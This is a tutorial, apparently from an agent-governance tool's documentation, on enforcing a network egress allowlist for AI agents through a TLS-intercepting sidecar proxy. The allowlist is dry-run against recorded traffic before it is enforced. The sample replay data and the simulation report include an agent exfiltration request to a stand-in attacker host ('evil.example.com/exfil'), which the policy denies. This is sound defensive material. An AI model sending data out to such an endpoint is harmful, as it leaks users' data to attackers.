# Enforce an egress policy

**Goal.** Restrict the hosts an agent is allowed to reach, so a prompt-injected
or confused agent cannot exfiltrate data to an arbitrary endpoint. You author a
network allowlist, dry-run it against recorded traffic *before* applying it, and
then enforce it at the proxy layer.

## How egress enforcement works

Network egress is the job of the **sidecar proxy** (`aa-proxy`), the second of
the three interception layers. It terminates outbound HTTPS with a per-host CA
(MitM) and, for every CONNECT, asks: *is this host on the policy's allowlist?*
Hosts that fail the check are refused before any bytes leave the machine — no
code change in the agent required.

The allowlist lives in the `network` section of a policy:

```yaml
apiVersion: agent-assembly/v1
kind: Policy
metadata:
  name: egress-allowlist
  version: "1.0.0"
spec:
  network:
    allowlist:
      - api.openai.com
      - "*.githubusercontent.com"
```

### Allowlist matching semantics

The proxy matches each requested host against every allowlist entry using these
rules (from `aa_core::policy::is_host_allowed_by_egress_allowlist`):

| Pattern | Matches | Does **not** match |
|---|---|---|
| `api.openai.com` | `api.openai.com` (case-insensitive, exact) | `evil.api.openai.com` |
| `*.githubusercontent.com` | `raw.githubusercontent.com`, `objects.githubusercontent.com` | bare `githubusercontent.com` |
| `*` | every host | — |
| _(empty allowlist)_ | every host (no restriction) | — |

The leftmost-label wildcard (`*.example.com`) requires at least one extra label
to the left and anchors on the right, so it cannot be fooled by an
attacker-crafted host like `example.com.evil.net`.

## Step 1 — Validate the policy locally

Validation parses and type-checks the YAML without contacting a gateway, and
warns about unrecognised keys so you catch typos early:

```console
$ aasm policy validate egress-policy.yaml
Policy is valid: egress-policy.yaml
```

## Step 2 — Dry-run against recorded traffic

`aasm policy simulate` replays an audit-log JSONL file through the policy engine
and reports what each event *would* have decided — without enforcing anything.
This is how you prove a new allowlist before it can break production traffic.

A replay file is one JSON object per line; each line is an audit event whose
`payload` is the serialized governance action. For egress, the action is a
`NetworkRequest`:

```json
{"event_type":"ToolCallIntercepted","agent_id":"researcher-1","payload":"{\"NetworkRequest\":{\"url\":\"https://api.openai.com/v1/chat/completions\",\"method\":\"POST\"}}"}
{"event_type":"ToolCallIntercepted","agent_id":"researcher-1","payload":"{\"NetworkRequest\":{\"url\":\"https://evil.example.com/exfil\",\"method\":\"POST\"}}"}
{"event_type":"ToolCallIntercepted","agent_id":"researcher-1","payload":"{\"NetworkRequest\":{\"url\":\"https://raw.githubusercontent.com/org/repo/main/README.md\",\"method\":\"GET\"}}"}
```

Run the simulation:

```console
$ aasm policy simulate --policy egress-policy.yaml --against traffic.jsonl
Simulation Report
--------------------------------------------------
Total events:       3
Allowed:            1
Denied:             2
Approval required:  0

EVENT#   ACTION               DECISION     REASON
----------------------------------------------------------------------
1        net:POST:https://evil.example.com/exfil deny         host not in network allowlist
2        net:GET:https://raw.githubusercontent.com/org/repo/main/README.md deny         host not in network allowlist
```

The report lists the flagged (non-allow) outcomes. `api.openai.com` (event 0)
was allowed and so does not appear in the flagged list; the exfiltration attempt
to `evil.example.com` was denied, as expected.

> **Honest caveat — two matchers, one allowlist.** The `raw.githubusercontent.com`
> request was *denied* by the simulator above even though `*.githubusercontent.com`
> is on the allowlist. That is because the `policy simulate` decision path matches
> the host with an **exact** string comparison, whereas the live `aa-proxy`
> CONNECT path uses the glob-aware matcher described in the table above (which
> *would* allow it). When validating wildcard egress rules, confirm the live
> proxy behaviour as well as the simulation; treat a simulation deny on a
> wildcard host as "verify against the proxy", not necessarily a real block.

For scripting and CI gating, write the structured report to a file and key off
the exit status:

```console
$ aasm policy simulate --policy egress-policy.yaml --against traffic.jsonl \
    --output-file report.json
$ cat report.json
{
  "total_events": 3,
  "denied": 2,
  "allowed": 1,
  "approval_required": 0,
  "budget_impact_usd": null,
  "flagged_outcomes": [
    { "event_index": 1, "action": "net:POST:https://evil.example.com/exfil",
      "decision": "deny", "reason": "host not in network allowlist" },
    { "event_index": 2, "action": "net:GET:https://raw.githubusercontent.com/org/repo/main/README.md",
      "decision": "deny", "reason": "host not in network allowlist" }
  ]
}
```

You can also dry-run against **live** traffic for a fixed window instead of a
file:

```console
$ aasm policy simulate --policy egress-policy.yaml --live --duration 60s
```

## Step 3 — Enforce at the proxy

Bring up the sidecar and trust its CA so TLS interception works:

```console
$ aasm proxy install-ca          # add the per-host CA to the OS trust store
$ aasm proxy start               # listens on 127.0.0.1:8899 by default
$ aasm proxy status
```

`aasm proxy start` accepts `--listen <addr>` (default `127.0.0.1:8899`),
`--gateway <url>` to point it at the gateway that owns the policy, and
`--ca-dir <dir>` for CA storage. Agents launched via `aasm run` have the proxy
injected automatically (Step 3 of
[Govern an agent end-to-end](govern-an-agent.md)); for other processes, route
their HTTPS through the proxy address.

When the policy is applied, the proxy refuses any CONNECT to a host outside the
allowlist and the refusal is written to the audit log.

## Result

Outbound traffic is now constrained to an explicit allowlist, verified with a
dry-run before it could affect a running agent, and enforced at the network
layer without modifying the agent's code.
